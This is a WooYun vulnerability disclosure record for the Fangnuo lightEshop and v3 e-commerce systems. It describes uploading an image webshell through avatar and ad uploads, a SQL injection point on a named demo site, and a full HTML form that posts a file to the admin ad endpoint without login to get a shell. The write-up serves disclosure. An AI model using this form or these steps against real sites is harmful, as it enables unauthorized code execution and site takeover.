{"id": 29654, "wybug_id": "wooyun-2015-0118674", "wybug_title": "方诺轻电商lightEshop+v3两大系统漏洞合集", "wybug_corp": "珠海方诺信息科技有限公司", "wybug_author": "路人甲", "wybug_date": "2015-06-10 10:51", "wybug_open_date": "2015-07-25 10:52", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-10：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-07-25：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： do anything you want do 详细说明：  先来说说v3官方v3的演示站为  http://demo.fnuo123.com/首先注册会员  \n\n修改头像处上传图片马 1.jpg图片马 然后抓包。\n\nGO，返回个人中心，可以看到\n\n菜刀连接图\n\n再来看看lightEshop官方演示站 http://dp.fnuo123.com/存在注入漏洞 随便找个注入点 http://dp.fnuo123.com/?mod=c2c&act=helper&id=132'报错\n\n boolean-based blind\n\n后台广告管理处存在任意文件上传，上传图片马 抓包改后缀\n\n\n\n\n\n另外 此处上传不用登录后台也可以 直接本地构造表单\n<div>  <form class=\"form-horizontal\" action=\"http://dp.fnuo123.com/admin/?mod=&act=adv&ctrl=saveEdit\" method=\"post\" enctype=\"multipart/form-data\">    <input name=\"id\" type=\"hidden\" value=\"13\">    <fieldset>    <div style=\"margin-left:160px; margin-bottom:20px;\"><img width=\"200px\" src=\"./无标题文档_files/1420361609.png\"></div>    <div class=\"control-group\">      <label class=\"control-label\" for=\"title\">广告名称：</label>      <div class=\"controls\">        <input id=\"title\" class=\"input-xlarge\" type=\"text\" name=\"title\" value=\"\">      </div>    </div>    <div class=\"control-group\">      <label class=\"control-label\" for=\"description\">位置说明：</label>      <div class=\"controls\">        <input id=\"description\" class=\"input-xlarge\" type=\"text\" name=\"description\" value=\"o2o底部\">        <span class=\"tips\">这只是一个位置说明</span> </div>    </div>    <div class=\"control-group\">      <label class=\"control-label\" for=\"target\">弹窗模式：</label>      <div class=\"controls\">        <select name=\"target\">          <option value=\"0\">内刷</option>          <option value=\"1\">弹窗</option>        </select>      </div>    </div>    <div class=\"control-group\" id=\"linktype\">      <label class=\"control-label\" for=\"LinkType\">链接类型：</label>      <div class=\"controls\">        <select id=\"LinkType\" class=\"select\" name=\"LinkType\" onchange=\"change()\">          <option value=\"1\">内链接</option>          <option value=\"0\">外链接</option>        </select>        <span class=\"tips\">注：系统默认为：内链接</span> </div>    </div>    <div class=\"control-group\" id=\"link1\">      <label class=\"control-label \" for=\"uid\">图片跳转位置</label>      <div class=\"controls\">        <select class=\"select\" name=\"uid\" id=\"action\" onchange=\"changeAction()\">                      <option value=\"1-0\" actiontype=\"0\">注册</option>                      <option value=\"147-0\" actiontype=\"0\">咨询中心</option>                      <option value=\"149-1\" actiontype=\"1\">商品列表</option>                      <option value=\"150-0\" actiontype=\"0\">帮助中心</option>                      <option value=\"151-0\" actiontype=\"0\">登录</option>                      <option value=\"152-4\" actiontype=\"4\">搜索商品</option>                      <option value=\"153-0\" actiontype=\"0\">导购首页</option>                      <option value=\"154-0\" actiontype=\"0\">o2o首页</option>                      <option value=\"155-0\" actiontype=\"0\">会员专享</option>                      <option value=\"156-2\" actiontype=\"2\">去哪儿</option>                      <option value=\"157-0\" actiontype=\"0\">o2o分享列表</option>                      <option value=\"158-0\" actiontype=\"0\">导购商城页</option>                      <option value=\"159-0\" actiontype=\"0\">商品搜索页</option>                  </select>      </div>    </div>    <div class=\"control-group\" id=\"link2\" style=\"display:none\">      <label class=\"control-label\" for=\"url\">url：</label>      <div class=\"controls\">        <input id=\"url\" class=\"input-xlarge\" type=\"text\" name=\"url\">        <span class=\"tips\">示例：http://www.baidu.com</span> </div>    </div>    <!--------------------1--------------------------->    <div id=\"shangping\" style=\"display:none;\" class=\"actiontype\">      <div class=\"control-group \">        <label class=\"control-label\">商品列表</label>        <div class=\"controls\">          <select class=\"select\" name=\"onecate\" id=\"onecate\">            <option value=\"0\">全部</option>                          <option value=\"108\">服装/男装/女装/裙裤</option>                          <option value=\"109\">鞋包/男鞋/女鞋/箱包</option>                          <option value=\"110\">配饰/内衣/服饰</option>                          <option value=\"111\">运动用品/户外鞋包</option>                          <option value=\"115\">家电/办公/生活/电器</option>                          <option value=\"116\">美妆/美容/护发/香水</option>                          <option value=\"117\">母婴/儿童/孕妇/玩具</option>                          <option value=\"119\">食品/零食/果蔬/饮料</option>                          <option value=\"1328\">特价优惠</option>                      </select>          <select id=\"twocate\" name=\"twocate\">            <option value=\"0\">全部</option>          </select>          <select id=\"threecate\" name=\"threecate\">            <option value=\"0\">全部</option>          </select>        </div>      </div>      <div class=\"control-group\">        <label class=\"control-label\">是否包邮</label>        <div class=\"controls\">          <select id=\"pa\" name=\"pa\">            <option value=\"0\">全部</option>            <option value=\"1\">包邮</option>            <option value=\"2\">不包邮</option>          </select>          <span class=\"tips\">注：系统默认为：全部</span> </div>      </div>      <div class=\"control-group\">        <label class=\"control-label\">商城</label>        <div class=\"controls\">          <select id=\"s\" name=\"s\">            <option value=\"0\">全部</option>                          <option value=\"1\">淘宝</option>                          <option value=\"2\">天猫</option>                          <option value=\"3\">唯品会</option>                      </select>          <span class=\"tips\">注：系统默认为：全部</span> </div>      </div>      <div class=\"control-group\">        <label class=\"control-label\">上市时间</label>        <div class=\"controls\">          <select id=\"times\" name=\"times\">                          <option value=\"0-0\">全部</option>                          <option value=\"1425139200-1433088000\">2015春季</option>                          <option value=\"1417363200-1425139200\">2014冬季</option>                          <option value=\"1409500800-1417363200\">2014秋季</option>                          <option value=\"1401552000-1409500800\">2014夏季</option>                          <option value=\"1393603200-1401552000\">2014春季</option>                          <option value=\"1385827200-1393603200\">2013冬季</option>                        注：系统默认为：全部          </select>        </div>      </div>      <div class=\"control-group\">        <label class=\"control-label\" for=\"\">价格：</label>        <div class=\"controls\">          <input id=\"spr\" class=\"input-xlarge\" type=\"text\" name=\"spr\" placeholder=\"￥\" style=\"width:40px;\" value=\"\">          -          <input id=\"epr\" class=\"input-xlarge\" type=\"text\" name=\"epr\" placeholder=\"￥\" style=\"width:40px;\" value=\"\">          <span class=\"tips\">注：系统默认价格区间为0</span> </div>      </div>    </div>        <!-------------------4----------------------------->        <div id=\"search\" style=\"display:none;\" class=\"actiontype\">      <div class=\"control-group\">        <label class=\"control-label\" for=\"keyword\">关键字：</label>        <div class=\"controls\">          <input id=\"keyword\" class=\"input-xlarge\" type=\"text\" name=\"keyword\">        </div>      </div>    </div>    <!-------------------2----------------------------->    <div id=\"gotowhere\" style=\"display:none;\" class=\"actiontype\">      <div class=\"control-group\">        <label class=\"control-label\" for=\"zhuanti\">专题：</label>        <div class=\"controls\">          <select name=\"zhuanti\" id=\"zhuanti\">            <option value=\"0\">全部</option>                          <option value=\"1\">情侣团</option>                          <option value=\"2\">亲子团</option>                          <option value=\"3\">哥们团</option>                          <option value=\"4\">新会员专享</option>                          <option value=\"5\">一元区</option>                          <option value=\"6\">秒杀区</option>                          <option value=\"7\">一周热卖</option>                      </select>        </div>      </div>      <div class=\"control-group\">        <label class=\"control-label\" for=\"o2ocates\">o2o分类：</label>        <div class=\"controls\">          <select name=\"o2ocates\" id=\"o2ocates\">            <option value=\"0\">全部</option>                          <option value=\"1337\">美食</option>                          <option value=\"1338\">酒店</option>                          <option value=\"1339\">电影</option>                          <option value=\"1340\">KTV</option>                          <option value=\"1341\">休闲娱乐</option>                          <option value=\"1342\">旅游</option>                          <option value=\"1343\">生活服务</option>                          <option value=\"1344\">购物</option>                          <option value=\"1345\">丽人</option>                      </select>          <select name=\"o2ocates2\" id=\"o2ocates2\">            <option value=\"0\">全部</option>          </select>        </div>      </div>      <div class=\"control-group\">        <label class=\"control-label\" for=\"jiagequjian\">价格区间：</label>        <div class=\"controls\">          <select name=\"jiagequjian\" id=\"jiagequjian\">            <option value=\"0\">全部</option>                          <option value=\"1\">0-20</option>                          <option value=\"2\">20-50</option>                          <option value=\"3\">50-80</option>                          <option value=\"4\">80-120</option>                          <option value=\"5\">120-200</option>                          <option value=\"6\">200-500</option>                          <option value=\"7\">500-800</option>                          <option value=\"8\">0-800</option>                      </select>        </div>      </div>      <div class=\"control-group\">        <label class=\"control-label\" for=\"usertime\">可用时段：</label>        <div class=\"controls\">          <select name=\"usertime\" id=\"usertime\">            <option value=\"0\">全部</option>                          <option value=\"1\">早上</option>                          <option value=\"2\">中午</option>                          <option value=\"3\">晚上</option>                          <option value=\"4\">夜宵</option>                      </select>        </div>      </div>      <div class=\"control-group\">        <label class=\"control-label\" for=\"person\">人数：</label>        <div class=\"controls\">          <select name=\"person\" id=\"person\">            <option value=\"0\">全部</option>                          <option value=\"1\">单人餐</option>                          <option value=\"2\">双人餐</option>                          <option value=\"3\">3~4人</option>                          <option value=\"4\">5~6人</option>                          <option value=\"5\">7~8人</option>                          <option value=\"6\">9~10人</option>                          <option value=\"7\">10人以上</option>                          <option value=\"8\">其他</option>                      </select>        </div>      </div>    </div>        <!--------------------end--------------------------->        <div class=\"control-group\">      <label class=\"control-label\" for=\"image\">广告图片：</label>      <div class=\"controls\">        <input id=\"image\" class=\"input-xlarge\" type=\"file\" name=\"image\" style=\"height:23px;\">      </div>    </div>        <div class=\"control-group\">      <label class=\"control-label\" for=\"type\">图片显示位置：</label>      <div class=\"controls\">        <select class=\"select\" name=\"type\">                                <option value=\"indexright\">首页右侧</option>                                         <option value=\"indexdown\">首页幻灯片下方</option>                                         <option value=\"clubbig\">会员俱乐部右侧</option>                                         <option value=\"footer\">底部</option>                                         <option value=\"o2oindexright\">o2o首页右侧</option>                                         <option value=\"o2ofoot\" selected=\"selected\">o2o底部</option>                                        <option value=\"o2ouser\">o2o会员专享</option>                                         <option value=\"o2oheader\">o2o头部</option>                                         <option value=\"sjzx\">商家中心注册</option>                        </select>        <span class=\"tips\">摆放的位置</span> </div>    </div>     <div class=\"control-group\">    <label class=\"control-label \" for=\"fabu\">发布到：</label>    <div class=\"controls\">      <select class=\"select\" name=\"fabu\" id=\"fabu\">                          <option value=\"c2c\">c2c</option>                                   <option value=\"base\">base</option>                                   <option value=\"o2o\" selected=\"selected\">o2o</option>                       </select>    </div>  </div>    <div class=\"control-group\">      <label class=\"control-label\" for=\"hide\">是否显示：</label>      <div class=\"controls\">        <select class=\"shortInput program\" name=\"hide\">                      <option value=\"0\" selected=\"selected\">显示</option>            <option value=\"1\">隐藏</option>                    </select>      </div>    </div>    <div class=\"control-group\">      <label class=\"control-label\" for=\"sort\">排序：</label>      <div class=\"controls\">        <input id=\"sort\" class=\"input-xlarge\" type=\"text\" name=\"sort\" value=\"0\">        <span class=\"tips\">数值越大，越靠前</span> </div>    </div>    <div class=\"form-actions\">      <input class=\"btn\" type=\"submit\" value=\"保存修改\" name=\"submit\">    </div>  </fieldset></form></div>\n修改action地址 也可以getshell。   漏洞证明：  见详细说明 影响范围\n\n\n\n\n\n还有很多就不一一截图了。。。   修复方案：  。。。。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}